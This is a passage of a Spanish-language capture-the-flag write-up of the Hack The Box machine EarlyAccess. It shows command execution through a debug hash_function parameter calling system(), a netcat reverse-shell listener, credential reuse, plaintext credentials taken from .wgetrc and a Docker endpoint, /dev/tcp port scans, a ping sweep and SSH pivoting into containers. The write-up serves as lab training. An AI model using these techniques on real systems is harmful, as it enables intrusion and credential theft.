<span id="cb17-13"><a href="#cb17-13" aria-hidden="true"></a><span class="st">000002241:   500        0 L      10 W       89 Ch       &quot;filepath&quot;                                                                                                             </span></span>
<span id="cb17-14"><a href="#cb17-14" aria-hidden="true"></a></span>
<span id="cb17-15"><a href="#cb17-15" aria-hidden="true"></a><span class="st">Total time: 0</span></span>
<span id="cb17-16"><a href="#cb17-16" aria-hidden="true"></a><span class="st">Processed Requests: 6453</span></span>
<span id="cb17-17"><a href="#cb17-17" aria-hidden="true"></a><span class="st">Filtered Requests: 6452</span></span>
<span id="cb17-18"><a href="#cb17-18" aria-hidden="true"></a><span class="st">Requests/sec.: 0</span></span></code></pre></div>
<p>Pero al tratar de acceder a algún archivo del sistema vemos que por motivos de seguridad no es posible leerlos.</p>
<img src="Img/Pasted image 20240513110645.png">
<p>Al tratar de leer el contenido del archivo <strong>hash.php</strong>, pero al tratarse de un archivo con extensión <strong>.php</strong> nos lo va a interpretar.</p>
<img src="Img/Pasted image 20240513110814.png">
<p>Una forma de poder ver el contenido es mediante wrappers de codificación en base64</p>
<img src="Img/Pasted image 20240513111229.png">
<img src="Img/Pasted image 20240513111240.png">
<p>Teniendo el contenido del archivo en base64, realizamos la decodificación, y lo guardamos al archivo <strong>hash.php</strong>.</p>
<img src="Img/Pasted image 20240513111350.png">
<p>Ahora al acceder al archivo <strong>hash.php</strong>, podemos ver el contenido de este.</p>
<img src="Img/Pasted image 20240513111546.png">
<p>Mirando el código vemos que permite hashes personalizados si la variable <strong>debug</strong> esta establecida.</p>
<img src="Img/Pasted image 20240513111736.png">
<p>Pero aparte de haches se podría probar con otras funciones, en este caso vamos a utilizar la función <strong>system</strong> y donde está la variable de <strong>password</strong> a hachear, lo cambiamos y ponemos un comando a nivel de sistema para que nos lo ejecute.</p>
<img src="Img/Pasted image 20240513111937.png">
<div class="sourceCode" id="cb18"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a>❯ php --interactive</span></code></pre></div>
<table>
<colgroup>
<col style="width: 14%" />
<col style="width: 85%" />
</colgroup>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>–interactive</td>
<td>Permite escribir y ejecutar código PHP directamente en la consola de comandos.</td>
</tr>
</tbody>
</table>
<div class="sourceCode" id="cb19"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a>Interactive mode enabled</span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a></span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true"></a>php &gt; <span class="kw">$password</span> = <span class="st">&quot;test&quot;</span><span class="ot">;</span></span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true"></a>php &gt; <span class="kw">$hash</span> = <span class="fu">md5</span><span class="ot">(</span><span class="kw">$password</span><span class="ot">);</span></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true"></a>php &gt; <span class="kw">echo</span> <span class="kw">$hash</span><span class="ot">;</span></span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true"></a>098f6bcd4621d373cade4e832627b4f6</span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true"></a>php &gt; <span class="kw">$password</span> = <span class="st">&quot;id&quot;</span><span class="ot">;</span></span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true"></a>php &gt; <span class="kw">$hash</span> = <span class="fu">system</span><span class="ot">(</span><span class="kw">$password</span><span class="ot">);</span></span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true"></a>uid=<span class="dv">0</span><span class="ot">(</span>root<span class="ot">)</span> gid=<span class="dv">0</span><span class="ot">(</span>root<span class="ot">)</span> groups=<span class="dv">0</span><span class="ot">(</span>root<span class="ot">)</span></span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true"></a>php &gt; </span></code></pre></div>
<p>Si añadimos la variable <strong>debug</strong> y cambiamos los valores de <strong>password</strong> y <strong>hash_function</strong> a los deseados, vemos que nos lo ejecuta con éxito.</p>
<img src="Img/Pasted image 20240513112804.png">
<img src="Img/Pasted image 20240513112824.png">
<p>Teniendo ya capacidad de ejecutar comandos en el sistema realizamos una <strong>ReverseShell</strong>.</p>
<p>Nos ponemos en escucha con netcat.</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> -lvnp 123</span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 123 ...</span></code></pre></div>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 90%" />
</colgroup>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-l</td>
<td>Indica que se pone en modo escucha en lugar de iniciar una conexión saliente</td>
</tr>
<tr class="even">
<td>-v</td>
<td>Se utiliza para mostrar información adicional o detalles sobre las operaciones que está realizando</td>
</tr>
<tr class="odd">
<td>-n</td>
<td>Se evita realizar resolución DNS</td>
</tr>
<tr class="even">
<td>-p</td>
<td>Indica el puerto por el cual se pondra en escucha</td>
</tr>
</tbody>
</table>
<p>Creamos la petición que enviara la shell inversera.</p>
<img src="Img/Pasted image 20240513113313.png">
<p>Y al tramitar la petición, recibimos la <strong>ReverseShell</strong>.</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> -lvnp 123</span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 123 ...</span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true"></a><span class="ex">connect</span> to [10.10.14.12] from (UNKNOWN) [<span class="ex">10.10.11.110</span>] 44624</span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true"></a><span class="ex">bash</span>: cannot set terminal process group (1)<span class="bu">:</span> Inappropriate ioctl for device</span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true"></a><span class="ex">bash</span>: no job control in this shell</span>
<span id="cb21-6"><a href="#cb21-6" aria-hidden="true"></a><span class="ex">www-data@webserver</span>:/var/www/earlyaccess.htb/dev/actions$</span></code></pre></div>
<h2 id="post-explotación">Post-explotación</h2>
<p>Al ver la IP de la maquina vemos que es otra, eso quiere decir que estamos en un contenedor.</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a><span class="ex">www-data@webserver</span>:/var/www/earlyaccess.htb/dev/actions$ hostname -I</span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a><span class="fu">hostname</span> -I</span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true"></a><span class="ex">172.18.0.102</span> </span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true"></a><span class="ex">www-data@webserver</span>:/var/www/earlyaccess.htb/dev/actions$</span></code></pre></div>
<p>Vemos que hay un usuario con el nombre <strong>www-adm</strong>.</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a><span class="ex">www-data@webserver</span>:/var/www/earlyaccess.htb/dev/actions$ grep <span class="st">&quot;sh$&quot;</span> /etc/passwd</span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">earlyaccess.htb/dev/actions</span>$ <span class="fu">grep</span> <span class="st">&quot;sh$&quot;</span> /etc/passwd     </span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true"></a><span class="ex">root</span>:x:0:0:root:/root:/bin/bash</span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true"></a><span class="ex">www-adm</span>:x:1000:1000::/home/www-adm:/bin/bash</span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true"></a><span class="ex">www-data@webserver</span>:/var/www/earlyaccess.htb/dev/actions$ </span></code></pre></div>
<p>Tratamos de ver si hay reutilización de credenciales con la contraseña <strong>gameover</strong>, y vemos que si funciona.</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a><span class="ex">www-data@webserver</span>:/var/www/earlyaccess.htb/dev/actions$ su www-adm </span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true"></a><span class="ex">Password</span>: </span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:/var/www/earlyaccess.htb/dev/actions$ whoami</span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true"></a><span class="ex">www-adm</span></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:/var/www/earlyaccess.htb/dev/actions$ </span></code></pre></div>
<p>Al acceder al directorio personal de trabajo vemos un archivo el cual contiene unas credenciales.</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ ls -la</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true"></a><span class="ex">total</span> 24</span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 2 www-adm www-adm 4096 May 13 07:52 .</span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 1 root    root    4096 May 13 07:52 ..</span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true"></a><span class="ex">lrwxrwxrwx</span> 1 root    root       9 May 13 07:52 .bash_history -<span class="op">&gt;</span> /dev/null</span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-adm www-adm  220 Apr 18  2019 .bash_logout</span>
<span id="cb25-7"><a href="#cb25-7" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-adm www-adm 3526 Apr 18  2019 .bashrc</span>
<span id="cb25-8"><a href="#cb25-8" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 www-adm www-adm  807 Apr 18  2019 .profile</span>
<span id="cb25-9"><a href="#cb25-9" aria-hidden="true"></a><span class="ex">-r--------</span> 1 www-adm www-adm   33 May 13 07:52 .wgetrc</span>
<span id="cb25-10"><a href="#cb25-10" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ cat .wgetrc </span>
<span id="cb25-11"><a href="#cb25-11" aria-hidden="true"></a><span class="va">user=</span>api</span>
<span id="cb25-12"><a href="#cb25-12" aria-hidden="true"></a><span class="va">password=</span>s3CuR3_API_PW!</span>
<span id="cb25-13"><a href="#cb25-13" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ </span></code></pre></div>
<p>Veo el nombre <strong>API</strong>, intentemos acceder a la API. Por lo general, los contenedores acoplables pueden comunicarse entre sí, si están en la misma red. Intentemos encontrar la IP de la API de Docker, probablemente el nombre de host sea <strong>api</strong>.</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ nc api 1234</span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a><span class="ex">api</span> [172.18.0.101] 1234 (?) <span class="bu">:</span> Connection refused</span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ </span></code></pre></div>
<p>Obtuvimos con éxito la IP <strong>172.18.0.101</strong> de la API usando netcat.</p>
<p>Tratamos de ver que puertos tiene abiertos.</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ for port in <span class="va">$(</span><span class="fu">seq</span> 1 65535<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="bu">echo</span> <span class="st">&#39;&#39;</span> <span class="op">&gt;</span> /dev/tcp/172.18.0.101/<span class="va">$port</span> <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="st">&quot;PORT </span><span class="va">$port</span><span class="st"> - OPEN&quot;</span><span class="kw">;</span> <span class="kw">done</span> <span class="op">2&gt;</span><span class="ex">/dev/null</span></span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true"></a><span class="ex">PORT</span> 5000 - OPEN</span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ </span></code></pre></div>
<p>Vemos que tiene el puerto 5000 abierto.</p>
<p>Intentemos acceder a la API utilizando <strong>wget</strong>.</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ wget http://172.18.0.101:5000</span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true"></a><span class="ex">--2024-05-13</span> 10:28:55--  http://172.18.0.101:5000/</span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true"></a><span class="ex">Connecting</span> to 172.18.0.101:5000... connected.</span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true"></a><span class="ex">HTTP</span> request sent, awaiting response... 200 OK</span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true"></a><span class="ex">Length</span>: 254 [application/json]</span>
<span id="cb28-6"><a href="#cb28-6" aria-hidden="true"></a><span class="ex">Saving</span> to: <span class="st">&#39;index.html&#39;</span></span>
<span id="cb28-7"><a href="#cb28-7" aria-hidden="true"></a></span>
<span id="cb28-8"><a href="#cb28-8" aria-hidden="true"></a><span class="ex">index.html</span>                                    100%[=================================================================================================<span class="op">&gt;</span>]     254  --.-KB/s    in 0s      </span>
<span id="cb28-9"><a href="#cb28-9" aria-hidden="true"></a></span>
<span id="cb28-10"><a href="#cb28-10" aria-hidden="true"></a><span class="ex">2024-05-13</span> 10:28:55 (40.6 MB/s) <span class="ex">-</span> <span class="st">&#39;index.html&#39;</span> saved [254/254]</span>
<span id="cb28-11"><a href="#cb28-11" aria-hidden="true"></a></span>
<span id="cb28-12"><a href="#cb28-12" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ cat index.html </span>
<span id="cb28-13"><a href="#cb28-13" aria-hidden="true"></a>{<span class="st">&quot;message&quot;</span>:<span class="st">&quot;Welcome to the game-key verification API! You can verify your keys via: /verify/&lt;game-key&gt;. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.&quot;</span>,<span class="st">&quot;status&quot;</span>:<span class="ex">200</span>}</span>
<span id="cb28-14"><a href="#cb28-14" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ </span></code></pre></div>
<p>Al ver el archivo <strong>index.html</strong> vemos la ruta <strong>check_db</strong>.</p>
<p>Si vemos el contenido de <strong>check_db</strong>, nos fijamos que tiene contenido <strong>JSON</strong>.</p>
<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ wget http://172.18.0.101:5000/check_db</span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true"></a><span class="ex">--2024-05-13</span> 10:31:30--  http://172.18.0.101:5000/check_db</span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true"></a><span class="ex">Connecting</span> to 172.18.0.101:5000... connected.</span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true"></a><span class="ex">HTTP</span> request sent, awaiting response... 401 UNAUTHORIZED</span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true"></a><span class="ex">Authentication</span> selected: Basic</span>
<span id="cb29-6"><a href="#cb29-6" aria-hidden="true"></a><span class="ex">Connecting</span> to 172.18.0.101:5000... connected.</span>
<span id="cb29-7"><a href="#cb29-7" aria-hidden="true"></a><span class="ex">HTTP</span> request sent, awaiting response... 200 OK</span>
<span id="cb29-8"><a href="#cb29-8" aria-hidden="true"></a><span class="ex">Length</span>: 8709 (8.5K) [<span class="ex">application</span>/<span class="ex">json</span>]</span>
<span id="cb29-9"><a href="#cb29-9" aria-hidden="true"></a><span class="ex">Saving</span> to: <span class="st">&#39;check_db&#39;</span></span>
<span id="cb29-10"><a href="#cb29-10" aria-hidden="true"></a></span>
<span id="cb29-11"><a href="#cb29-11" aria-hidden="true"></a><span class="ex">check_db</span>                                      100%[=================================================================================================<span class="op">&gt;</span>]   8.50K  --.-KB/s    in 0s      </span>
<span id="cb29-12"><a href="#cb29-12" aria-hidden="true"></a></span>
<span id="cb29-13"><a href="#cb29-13" aria-hidden="true"></a><span class="ex">2024-05-13</span> 10:31:30 (172 MB/s) <span class="ex">-</span> <span class="st">&#39;check_db&#39;</span> saved [8709/8709]</span>
<span id="cb29-14"><a href="#cb29-14" aria-hidden="true"></a></span>
<span id="cb29-15"><a href="#cb29-15" aria-hidden="true"></a><span class="ex">www-adm@webserver</span>:~$ cat check_db </span>
<span id="cb29-16"><a href="#cb29-16" aria-hidden="true"></a>{<span class="st">&quot;message&quot;</span>:{<span class="st">&quot;AppArmorProfile&quot;</span>:<span class="st">&quot;docker-default&quot;</span>,<span class="st">&quot;Args&quot;</span>:[<span class="st">&quot;--character-set-server=utf8mb4&quot;</span>,<span class="st">&quot;--collation-server=utf8mb4_bin&quot;</span>,<span class="st">&quot;--skip-character-set-client-handshake&quot;</span>,<span class="st">&quot;--max_allowed_packet=50MB&quot;</span>,<span class="st">&quot;--general_log=0&quot;</span>,<span class="st">&quot;--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES&quot;</span>],<span class="st">&quot;Config&quot;</span>:{<span class="st">&quot;AttachStderr&quot;</span>:<span class="ex">false</span>,<span class="st">&quot;AttachStdin&quot;</span></span></code></pre></div>
<p>Vamos a utilizar el comando <strong>jq</strong> para poder visualizar el contenido JSON de forma mas cómoda.</p>
<img src="Img/Pasted image 20240513124030.png">
<p>Al ver el contenido del archivo vemos unas credenciales.</p>
<img src="Img/Pasted image 20240513124052.png">
<img src="Img/Pasted image 20240513124143.png">
<p>Si tratamos de conectarnos vía SSH con esas credenciales, nos funciona.</p>
<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true"></a>❯ <span class="fu">ssh</span> drew@10.10.11.110</span>
<span id="cb30-2"><a href="#cb30-2" aria-hidden="true"></a><span class="ex">drew@10.10.11.110</span><span class="st">&#39;s password: </span></span>
<span id="cb30-3"><a href="#cb30-3" aria-hidden="true"></a><span class="st">Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span></span>
<span id="cb30-4"><a href="#cb30-4" aria-hidden="true"></a></span>
<span id="cb30-5"><a href="#cb30-5" aria-hidden="true"></a><span class="st">The programs included with the Debian GNU/Linux system are free software;</span></span>
<span id="cb30-6"><a href="#cb30-6" aria-hidden="true"></a><span class="st">the exact distribution terms for each program are described in the</span></span>
<span id="cb30-7"><a href="#cb30-7" aria-hidden="true"></a><span class="st">individual files in /usr/share/doc/*/copyright.</span></span>
<span id="cb30-8"><a href="#cb30-8" aria-hidden="true"></a></span>
<span id="cb30-9"><a href="#cb30-9" aria-hidden="true"></a><span class="st">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span>
<span id="cb30-10"><a href="#cb30-10" aria-hidden="true"></a><span class="st">permitted by applicable law.</span></span>
<span id="cb30-11"><a href="#cb30-11" aria-hidden="true"></a><span class="st">You have mail.</span></span>
<span id="cb30-12"><a href="#cb30-12" aria-hidden="true"></a><span class="st">Last login: Sun Sep  5 15:56:50 2021 from 10.10.14.6</span></span>
<span id="cb30-13"><a href="#cb30-13" aria-hidden="true"></a><span class="st">drew@earlyaccess:~$ </span></span></code></pre></div>
<p>Vemos las primera flag.</p>
<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ ls</span>
<span id="cb31-2"><a href="#cb31-2" aria-hidden="true"></a><span class="ex">user.txt</span></span>
<span id="cb31-3"><a href="#cb31-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ cat user.txt </span>
<span id="cb31-4"><a href="#cb31-4" aria-hidden="true"></a><span class="ex">e71*****************************</span></span>
<span id="cb31-5"><a href="#cb31-5" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Si miramos la clave publica vemos que esta generada para el usuario <strong>game-tester</strong> con el nombre de maquina <strong>game-server</strong>.</p>
<div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ cat .ssh/id_rsa.pub </span>
<span id="cb32-2"><a href="#cb32-2" aria-hidden="true"></a><span class="ex">ssh-rsa</span> AAAAB3NzaC1yc2EAAAADAQABAAACAQDMYU1DjEX8HWBPFBxoN+JXFBJUZBPr+IFO5yI25HMkFSlQZLaJajtEHeoBsD1ldSi7Q0qHYvVhYh7euYhr85vqa3cwGqJqJH54Dr5WkNDbqrB5AfgOWkUIomV4QkfZSmKSmI2UolEjVf1pIYYsJY+glqzJLF4hQ8x4d2/vJj3CmWDJeA0AGH0+3sjpmpYyoY+a2sW0JAPCDvovO1aT7FOnYKj3Qyl7NDGwJkOoqzZ66EmU3J/1F0e5XNg74wK8dvpZOJMzHola1CS8NqRhUJ7RO2EEZ0ITzmuLmY9s2N4ZgQPlwUvhV5Aj9hqckV8p7IstrpdGsSbZEv4CR2brsEhwsspAJHH+350e3dCYMR4qDyitsLefk2ezaBRAxrXmZaeNeBCZrZmqQ2+Knak6JBhLge9meo2L2mE5IoPcjgH6JBbYOMD/D3pC+MAfxtNX2HhB6MR4Rdo7UoFUTbp6KIpVqtzEB+dV7WeqMwUrrZjs72qoGvO82OvGqJON5F/OhoHDao+zMJWxNhE4Zp4DBii39qhm2wC6xPvCZT0ZSmdCe3pB82Jbq8yccQD0XGtLgUFv1coaQkl/CU5oBymR99AXB/QnqP8aML7ufjPbzzIEGRfJVE2A3k4CQs4Zo+GAEq7WNy1vOJ5rZBucCUXuc2myZjHXDw77nvettGYr5lcS8w== game-tester@game-server</span>
<span id="cb32-3"><a href="#cb32-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Nuestro nombre de maquina es <strong>earlyaccess</strong>.</p>
<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ hostname</span>
<span id="cb33-2"><a href="#cb33-2" aria-hidden="true"></a><span class="ex">earlyaccess</span></span>
<span id="cb33-3"><a href="#cb33-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Vemos varias interfaces de red</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ hostname -I</span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true"></a><span class="ex">10.10.11.110</span> 172.17.0.1 172.18.0.1 172.19.0.1 </span>
<span id="cb34-3"><a href="#cb34-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Por lo que el nombre de <strong>game-server</strong> seguramente sea de alguno de esos contenedores desplegados.</p>
<p>Vamos a tratar de enumerar todos los host de las 3 interfaces de red.</p>
<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ for host in <span class="va">$(</span><span class="fu">seq</span> 2 254<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="kw">(</span><span class="fu">ping</span> -c 1 172.17.0.<span class="va">$host</span> <span class="op">&amp;&gt;</span>/dev/null <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="st">&quot;172.17.0.</span><span class="va">$host</span><span class="st">&quot;</span> <span class="kw">&amp;)</span>; <span class="kw">done</span></span>
<span id="cb35-2"><a href="#cb35-2" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ for host in <span class="va">$(</span><span class="fu">seq</span> 2 254<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="kw">(</span><span class="fu">ping</span> -c 1 172.18.0.<span class="va">$host</span> <span class="op">&amp;&gt;</span>/dev/null <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="st">&quot;172.18.0.</span><span class="va">$host</span><span class="st">&quot;</span> <span class="kw">&amp;)</span>; <span class="kw">done</span></span>
<span id="cb35-3"><a href="#cb35-3" aria-hidden="true"></a><span class="ex">172.18.0.2</span></span>
<span id="cb35-4"><a href="#cb35-4" aria-hidden="true"></a><span class="ex">172.18.0.100</span></span>
<span id="cb35-5"><a href="#cb35-5" aria-hidden="true"></a><span class="ex">172.18.0.102</span></span>
<span id="cb35-6"><a href="#cb35-6" aria-hidden="true"></a><span class="ex">172.18.0.101</span></span>
<span id="cb35-7"><a href="#cb35-7" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ for host in <span class="va">$(</span><span class="fu">seq</span> 2 254<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="kw">(</span><span class="fu">ping</span> -c 1 172.19.0.<span class="va">$host</span> <span class="op">&amp;&gt;</span>/dev/null <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="st">&quot;172.19.0.</span><span class="va">$host</span><span class="st">&quot;</span> <span class="kw">&amp;)</span>; <span class="kw">done</span></span>
<span id="cb35-8"><a href="#cb35-8" aria-hidden="true"></a><span class="ex">172.19.0.3</span></span>
<span id="cb35-9"><a href="#cb35-9" aria-hidden="true"></a><span class="ex">172.19.0.4</span></span>
<span id="cb35-10"><a href="#cb35-10" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Con los hosts ya descubiertos vamos a tratar de ver cuales tiene el puerto <strong>22</strong> abierto.</p>
<div class="sourceCode" id="cb36"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ hosts=(172.18.0.2 172.18.0.100 172.18.0.101 172.18.0.102 172.19.0.3 172.19.0.4); <span class="kw">for</span> <span class="ex">host</span> in <span class="va">${hosts[@]}</span><span class="kw">;</span> <span class="kw">do</span> <span class="kw">(</span><span class="ex">timeout</span> 1 bash -c <span class="st">&quot;echo &#39;&#39; &gt; /dev/tcp/</span><span class="va">$host</span><span class="st">/22&quot;</span> <span class="op">&amp;&gt;</span>/dev/null <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="st">&quot;Host </span><span class="va">$host</span><span class="st"> - Port 22 - OPEN&quot;</span><span class="kw">)</span>; <span class="kw">done</span></span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true"></a><span class="ex">Host</span> 172.19.0.3 - Port 22 - OPEN</span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Vemos que la IP <strong>172.19.0.3</strong> tiene el puerto <strong>22</strong> abierto.</p>
<p>Si tratamos de acceder vía SSH a esa IP con la clave publica, nos funciona.</p>
<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ ssh game-tester@172.19.0.3</span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true"></a><span class="ex">The</span> authenticity of host <span class="st">&#39;172.19.0.3 (172.19.0.3)&#39;</span> can<span class="st">&#39;t be established.</span></span>
<span id="cb37-3"><a href="#cb37-3" aria-hidden="true"></a><span class="st">ECDSA key fingerprint is SHA256:QGqB7McazHmqza1M22cUpTR7oLwbktNXZZOJFO5ygQA.</span></span>
<span id="cb37-4"><a href="#cb37-4" aria-hidden="true"></a><span class="st">Are you sure you want to continue connecting (yes/no)? yes</span></span>
<span id="cb37-5"><a href="#cb37-5" aria-hidden="true"></a><span class="st">Warning: Permanently added &#39;</span>172.19.0.3<span class="st">&#39; (ECDSA) to the list of known hosts.</span></span>
<span id="cb37-6"><a href="#cb37-6" aria-hidden="true"></a><span class="st">Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span></span>
<span id="cb37-7"><a href="#cb37-7" aria-hidden="true"></a></span>
<span id="cb37-8"><a href="#cb37-8" aria-hidden="true"></a><span class="st">The programs included with the Debian GNU/Linux system are free software;</span></span>
<span id="cb37-9"><a href="#cb37-9" aria-hidden="true"></a><span class="st">the exact distribution terms for each program are described in the</span></span>
